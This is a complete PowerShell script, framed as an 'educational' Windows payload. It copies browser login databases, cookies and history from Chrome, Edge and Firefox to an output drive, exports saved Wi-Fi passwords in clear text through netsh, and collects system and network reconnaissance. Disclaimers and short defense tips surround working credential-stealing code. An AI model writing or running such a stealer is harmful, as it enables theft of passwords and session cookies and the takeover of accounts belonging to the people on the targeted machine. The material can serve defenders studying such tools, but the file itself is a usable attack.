# Windows Payload for Educational Cybersecurity Tool
# This PowerShell script demonstrates common data extraction techniques
# for educational and authorized testing purposes only.

# Educational Purpose:
# - Shows how credentials might be extracted from browsers
# - Demonstrates system information gathering
# - Illustrates the importance of data-at-rest encryption
# - Teaches defense strategies against such attacks

# IMPORTANT: Only use on systems with explicit written permission!

param(
    [string]$OutputPath = "D:",
    [switch]$Verbose
)

# Educational disclaimer
Write-Host "=== EDUCATIONAL CYBERSECURITY DEMONSTRATION ===" -ForegroundColor Yellow
Write-Host "This script is for authorized testing and education only!" -ForegroundColor Red
Write-Host "Ensure you have explicit permission before running!" -ForegroundColor Red

# Function to create directories safely
function New-SafeDirectory {
    param([string]$Path)
    
    try {
        if (-not (Test-Path $Path)) {
            New-Item -ItemType Directory -Force -Path $Path | Out-Null
            if ($Verbose) { Write-Host "Created directory: $Path" }
        }
        return $true
    }
    catch {
        Write-Warning "Failed to create directory: $Path - $($_.Exception.Message)"
        return $false
    }
}

# Function to copy files safely with error handling
function Copy-SafeFile {
    param(
        [string]$Source,
        [string]$Destination,
        [string]$Description
    )
    
    try {
        if (Test-Path $Source) {
            Copy-Item $Source $Destination -ErrorAction Stop
            if ($Verbose) { Write-Host "Copied $Description from $Source" }
            return $true
        }
        else {
            Write-Warning "$Description not found at $Source"
            return $false
        }
    }
    catch {
        Write-Warning "Failed to copy $Description`: $($_.Exception.Message)"
        return $false
    }
}

# Main execution
try {
    Write-Host "Starting Windows data extraction demonstration..." -ForegroundColor Green
    
    # Create base directories
    $ChromeDir = Join-Path $OutputPath "chrome"
    $EdgeDir = Join-Path $OutputPath "edge"
    $FirefoxDir = Join-Path $OutputPath "firefox"
    $WifiDir = Join-Path $OutputPath "wifi"
    
    New-SafeDirectory $ChromeDir
    New-SafeDirectory $EdgeDir
    New-SafeDirectory $FirefoxDir
    New-SafeDirectory $WifiDir
    
    # Educational note about browser data
    Write-Host "`nEDUCATIONAL NOTE: Browser Data Extraction" -ForegroundColor Cyan
    Write-Host "This demonstrates how browser credentials are stored locally and can be extracted."
    Write-Host "Defense: Use master passwords, enable full-disk encryption, regular security updates."
    
    # Chrome data extraction (educational demonstration)
    $ChromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    if (Test-Path $ChromePath) {
        Write-Host "Demonstrating Chrome data extraction..." -ForegroundColor Yellow
        
        # Copy login data (encrypted by Chrome's built-in protection)
        Copy-SafeFile "$ChromePath\Login Data" "$ChromeDir\login_data.db" "Chrome login database"
        
        # Copy cookies
        Copy-SafeFile "$ChromePath\Cookies" "$ChromeDir\cookies.db" "Chrome cookies database"
        
        # Copy history
        Copy-SafeFile "$ChromePath\History" "$ChromeDir\history.db" "Chrome browsing history"
        
        # Copy bookmarks
        Copy-SafeFile "$ChromePath\Bookmarks" "$ChromeDir\bookmarks.json" "Chrome bookmarks"
    }
    else {
        Write-Host "Chrome not found or not installed" -ForegroundColor Gray
    }
    
    # Microsoft Edge data extraction
    $EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    if (Test-Path $EdgePath) {
        Write-Host "Demonstrating Edge data extraction..." -ForegroundColor Yellow
        
        Copy-SafeFile "$EdgePath\Login Data" "$EdgeDir\login_data.db" "Edge login database"
        Copy-SafeFile "$EdgePath\Cookies" "$EdgeDir\cookies.db" "Edge cookies database"
        Copy-SafeFile "$EdgePath\History" "$EdgeDir\history.db" "Edge browsing history"
        Copy-SafeFile "$EdgePath\Bookmarks" "$EdgeDir\bookmarks.json" "Edge bookmarks"
    }
    else {
        Write-Host "Microsoft Edge not found or not installed" -ForegroundColor Gray
    }
    
    # Firefox data extraction (if available)
    $FirefoxProfilesPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $FirefoxProfilesPath) {
        Write-Host "Demonstrating Firefox data extraction..." -ForegroundColor Yellow
        
        $FirefoxProfiles = Get-ChildItem $FirefoxProfilesPath -Directory
        foreach ($Profile in $FirefoxProfiles) {
            $ProfilePath = $Profile.FullName
            $ProfileName = $Profile.Name
            
            Copy-SafeFile "$ProfilePath\logins.json" "$FirefoxDir\$ProfileName-logins.json" "Firefox logins"
            Copy-SafeFile "$ProfilePath\cookies.sqlite" "$FirefoxDir\$ProfileName-cookies.sqlite" "Firefox cookies"
            Copy-SafeFile "$ProfilePath\places.sqlite" "$FirefoxDir\$ProfileName-places.sqlite" "Firefox history/bookmarks"
        }
    }
    else {
        Write-Host "Firefox not found or not installed" -ForegroundColor Gray
    }
    
    # Educational note about Wi-Fi data
    Write-Host "`nEDUCATIONAL NOTE: Wi-Fi Credential Extraction" -ForegroundColor Cyan
    Write-Host "This demonstrates how Wi-Fi passwords are stored in Windows and can be extracted."
    Write-Host "Defense: Use enterprise Wi-Fi security, avoid saving personal network passwords on work devices."
    
    # Wi-Fi profile extraction
    Write-Host "Demonstrating Wi-Fi profile extraction..." -ForegroundColor Yellow
    try {
        netsh wlan export profile key=clear folder="$WifiDir"
        if ($?) {
            Write-Host "Wi-Fi profiles exported successfully"
        }
    }
    catch {
        Write-Warning "Failed to export Wi-Fi profiles: $($_.Exception.Message)"
    }
    
    # Educational note about system information
    Write-Host "`nEDUCATIONAL NOTE: System Information Gathering" -ForegroundColor Cyan
    Write-Host "This demonstrates how system information can be gathered for reconnaissance."
    Write-Host "Defense: Minimize information disclosure, use system hardening, monitor for reconnaissance."
    
    # System information collection
    Write-Host "Gathering system information for educational analysis..." -ForegroundColor Yellow
    
    $SystemInfoPath = Join-Path $OutputPath "system_info.txt"
    $NetworkInfoPath = Join-Path $OutputPath "network_info.txt"
    
    try {
        # Comprehensive system information
        @"
=== EDUCATIONAL SYSTEM INFORMATION DEMONSTRATION ===
Collection Time: $(Get-Date)
Purpose: Cybersecurity education and authorized testing

=== BASIC SYSTEM INFO ===
"@ | Out-File $SystemInfoPath -Encoding UTF8
        
        systeminfo | Out-File $SystemInfoPath -Append -Encoding UTF8
        
        "`n=== INSTALLED SOFTWARE (Security-relevant) ===" | Out-File $SystemInfoPath -Append -Encoding UTF8
        Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor | Out-File $SystemInfoPath -Append -Encoding UTF8
        
        "`n=== RUNNING PROCESSES ===" | Out-File $SystemInfoPath -Append -Encoding UTF8
        Get-Process | Select-Object ProcessName, Id, CPU, WorkingSet | Out-File $SystemInfoPath -Append -Encoding UTF8
        
        "`n=== NETWORK CONFIGURATION ===" | Out-File $NetworkInfoPath -Encoding UTF8
        ipconfig /all | Out-File $NetworkInfoPath -Append -Encoding UTF8
        
        "`n=== NETWORK CONNECTIONS ===" | Out-File $NetworkInfoPath -Append -Encoding UTF8
        netstat -an | Out-File $NetworkInfoPath -Append -Encoding UTF8
        
        "`n=== ARP TABLE ===" | Out-File $NetworkInfoPath -Append -Encoding UTF8
        arp -a | Out-File $NetworkInfoPath -Append -Encoding UTF8
        
        Write-Host "System information collected successfully"
    }
    catch {
        Write-Warning "Failed to collect some system information: $($_.Exception.Message)"
    }
    
    # Create summary file
    $SummaryPath = Join-Path $OutputPath "collection_summary.txt"
    @"
=== EDUCATIONAL CYBERSECURITY TOOL - COLLECTION SUMMARY ===

Collection Date: $(Get-Date)
Target System: $env:COMPUTERNAME
Current User: $env:USERNAME
Tool Purpose: Educational demonstration of data extraction techniques

IMPORTANT DISCLAIMER:
This data was collected for educational purposes and authorized security testing.
Unauthorized use of this tool or its collected data is illegal and unethical.

Files Collected:
- Browser databases (Chrome, Edge, Firefox)
- Wi-Fi configuration profiles
- System information
- Network configuration

Educational Value:
This demonstrates common attack vectors and highlights the importance of:
1. Full-disk encryption
2. Browser master passwords
3. Enterprise Wi-Fi security
4. System hardening
5. Endpoint detection and response (EDR)
6. Regular security awareness training

Next Steps:
1. Analyze collected data responsibly
2. Document findings for educational purposes
3. Implement appropriate security controls
4. Share knowledge with security community (anonymized)

=== END SUMMARY ===
"@ | Out-File $SummaryPath -Encoding UTF8
    
    Write-Host "`nCollection completed successfully!" -ForegroundColor Green
    Write-Host "Summary written to: $SummaryPath" -ForegroundColor Green
    
    # Educational reminder
    Write-Host "`nREMEMBER: This tool is for education and authorized testing only!" -ForegroundColor Red
    Write-Host "Always ensure you have explicit permission before using on any system." -ForegroundColor Red
}
catch {
    Write-Error "Script execution failed: $($_.Exception.Message)"
    exit 1
}

Write-Host "`nWindows payload demonstration completed." -ForegroundColor Green